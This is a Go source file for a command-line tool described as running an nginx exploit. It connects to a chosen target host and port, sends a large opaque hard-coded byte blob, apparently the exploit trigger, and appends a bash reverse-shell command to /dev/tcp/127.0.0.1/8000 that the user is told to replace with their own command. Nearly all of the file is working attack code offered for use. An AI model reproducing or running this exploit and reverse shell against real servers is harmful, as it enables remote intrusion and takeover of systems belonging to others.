package main

import (
	"fmt"
	"net"

	"github.com/spfl13/cobra"
)

func initRunCmd() *cobra.Command {
	runCmd := &cobra.Command{
		Use:   "run",
		Short: "run a nginx exploit",
		Run:   run,
	}
	runCmd.Flags().StringP("target", "t", "127.0.0.1", "Target Host")
	runCmd.Flags().StringP("port", "p", "80", "TargetPort")
	return runCmd
}

func run(cmd *cobra.Command, args []string) {
	target, _ := cmd.Flags().GetString("target")
	port, _ := cmd.Flags().GetString("port")

	conn, err := net.Dial("tcp", target+":"+port)
	if err != nil {
		fmt.Printf("conn server failed, err:%v\n", err)
		return
	}
	b := []byte{236, 134, 0, 98, 0, 0, 0, 190, 108, 0, 8, 160, 0, 0, 104, 58, 116, 0, 226, 205, 189, 208, 87, 152, 131, 213, 238, 94, 119, 0, 0, 0, 13, 11, 0, 72, 0, 93, 19, 214, 0, 0, 245, 26, 103, 189, 0, 182, 187, 159, 223, 205, 0, 227, 194, 31, 217, 84, 0, 0, 144, 0, 184, 225, 13, 177, 11, 0, 145, 203, 171, 86, 0, 99, 127, 122, 66, 251, 53, 182, 147, 23, 213, 178, 94, 174, 82, 140, 64, 0, 131, 35, 221, 244, 0, 206, 192, 239, 0, 33, 25, 128, 17, 0, 0, 247, 181, 240, 0, 211, 117, 243, 13, 53, 0, 222, 157, 117, 213, 0, 69, 181, 0, 65, 86, 48, 158, 70, 98, 0, 138, 0, 12, 207, 219, 0, 0, 0, 56, 124, 48, 0, 238, 184, 15, 151, 21, 0, 24, 43, 0, 179, 30, 50, 0, 66, 103, 207, 197, 205, 0, 52, 0, 231, 0, 0, 0, 38, 0, 65, 226, 121, 125, 0, 98, 113, 120, 0, 181, 172, 0, 18, 0, 159, 0, 0, 186, 0, 179, 205, 70, 17, 147, 4, 0, 135, 0, 98, 47, 168, 146, 8, 8, 141, 24, 0, 81, 0, 0, 211, 174, 191, 59, 52, 244, 171, 0, 28, 126, 156, 110, 64, 68, 0, 199, 238, 113, 207, 155, 146, 122, 242, 0, 194, 199, 96, 0, 10, 0, 244, 4, 127, 0, 168, 0, 94, 48, 41, 161, 193, 0, 136, 0, 149, 138, 78, 159, 0, 97, 195, 13, 19, 0, 0, 72, 57, 172, 0, 67, 84, 0, 248, 89, 0, 62, 195, 42, 223, 128, 173, 0, 24, 0, 246, 92, 66, 227, 77, 79, 123, 214, 18, 228, 167, 124, 143, 0, 244, 7, 161, 242, 137, 158, 76, 238, 35, 81, 0, 81, 0, 238, 0, 149, 255, 157, 19, 232, 0, 170, 165, 185, 77, 189, 187, 103, 160, 176, 190, 171, 119, 213, 159, 162, 128, 178, 207, 27, 83, 44, 8, 0, 220, 61, 139, 251, 212, 226, 0, 194, 18, 251, 136, 0, 0, 169, 35, 171, 0, 145, 0, 235, 0, 52, 191, 85, 0, 0, 209, 103, 7, 0, 167, 91, 202, 0, 124, 0, 21, 13, 23, 67, 39, 129, 0, 121, 149, 0, 66, 0, 66, 208, 57, 13, 88, 214, 58, 42, 15, 249, 223, 155, 190, 146, 0, 100, 21, 27, 130, 0, 6, 161, 176, 0, 102, 125, 116, 0, 0, 195, 160, 106, 164, 202, 196, 0, 0, 38, 0, 11, 219, 104, 38, 47, 29, 203, 215, 0, 158, 231, 0, 95, 246, 108, 47, 88, 250, 4, 219, 183, 214, 82, 76, 0, 209, 161, 160, 126, 90, 0, 250, 84, 0, 174, 119, 0, 169, 52, 55, 73, 0, 247, 90, 102, 159, 20, 179, 0, 26, 182, 0, 190, 0, 202, 165, 0, 153, 45, 161, 0, 43, 224, 81, 112, 173, 158, 150, 168, 193, 156, 79, 187, 117, 207, 121, 0, 146, 177, 123, 17, 0, 57, 163, 202, 0, 0, 69, 165, 0, 94, 80, 232, 0, 82, 105, 0, 132, 231, 225, 76, 251, 11, 144, 4, 125, 121, 193, 107, 50, 0, 155, 223, 143, 223, 0, 180, 201, 136, 18, 0, 73, 236, 0, 220, 142, 253, 222, 100, 0, 209, 228, 0, 46, 213, 0, 0, 0, 0, 243, 18, 122, 164, 0, 166, 106, 19, 7, 80, 139, 216, 218, 245, 23, 11, 0, 153, 174, 0, 242, 0, 3, 8, 6, 99, 13, 120, 17, 110, 0, 128, 72, 177, 0, 34, 83, 59, 221, 203, 188, 130, 96, 12, 219, 58, 249, 148, 68, 235, 10, 0, 213, 0, 164, 27, 136, 216, 51, 208, 0, 150, 151, 41, 153, 0, 241, 58, 194, 224, 43, 103, 212, 180, 171, 82, 226, 186, 204, 140, 0, 62, 29, 248, 233, 51, 180, 138, 217, 78, 14, 0, 39, 206, 190, 209, 52, 157, 0, 77, 83, 245, 123, 44, 158, 206, 189, 0, 0, 0, 57, 0, 174, 87, 86, 175, 0, 24, 233, 94, 151, 171, 56, 173, 0, 73, 115, 18, 239, 13, 110, 135, 44, 20, 118, 0, 64, 44, 244, 0, 142, 188, 194, 8, 106, 184, 0, 180, 20, 0, 206, 65, 238, 67, 181, 0, 208, 33, 250, 0, 219, 20, 114, 64, 0, 68, 125, 0, 220, 17, 120, 187, 255, 151, 222, 24, 0, 0, 54, 170, 77, 138, 0, 0, 165, 50, 253, 0, 0, 15, 232, 189, 175, 2, 65, 0, 0, 86, 178, 160, 233, 119, 119, 23, 30, 228, 202, 193, 137, 83, 216, 0, 89, 196, 90, 217, 158, 12, 178, 5, 94, 237, 202, 185, 0, 147, 0, 91, 246, 195, 43, 9, 149, 167, 118, 0, 98, 32, 210, 41, 35, 230, 136, 0, 89, 75, 12, 165, 0, 0, 129, 227, 153, 0, 0, 15, 49, 145, 0, 48, 117, 229, 38, 0, 216, 0, 167, 31, 27, 0, 133, 167, 155, 81, 0, 64, 13, 0, 181, 0, 24, 28, 0, 63, 193, 109, 0, 0, 0, 74, 242, 0, 255, 0, 163, 245, 0, 3, 0, 31, 166, 120, 0, 18, 178, 0, 55, 176, 174, 24, 241, 200, 5, 71, 30, 88, 143, 0, 52, 0, 0, 198, 149, 208, 0, 0, 187, 0, 0, 217, 131, 249, 132, 43, 3, 170, 0, 0, 163, 221, 229, 81, 2, 64, 0, 239, 145, 58, 166, 199, 0, 161, 34, 80, 0, 227, 131, 128, 142, 148, 229, 139, 0, 50, 237, 135, 81, 158, 207, 29, 0, 0, 161, 0, 55, 129, 25, 254, 62, 131, 64, 0, 42, 0, 25, 60, 0, 234, 0, 98, 0, 100, 137, 66, 36, 20, 47, 210, 0, 84, 228, 0, 44, 85, 211, 54, 194, 0, 177, 78, 71, 0, 3, 0, 213, 0, 24, 20, 0, 195, 195, 156, 162, 234, 0, 222, 11, 110, 26, 186, 36, 205, 123}
	payload := []byte("bash -c 'bash -i >&/dev/tcp/127.0.0.1/8000 0>&1'") //input your command
	_, err = conn.Write(append(b, payload...))
	if err != nil {
		fmt.Printf("send failed, err:%v\n", err)
		return
	}
	fmt.Printf("expoit success")
}
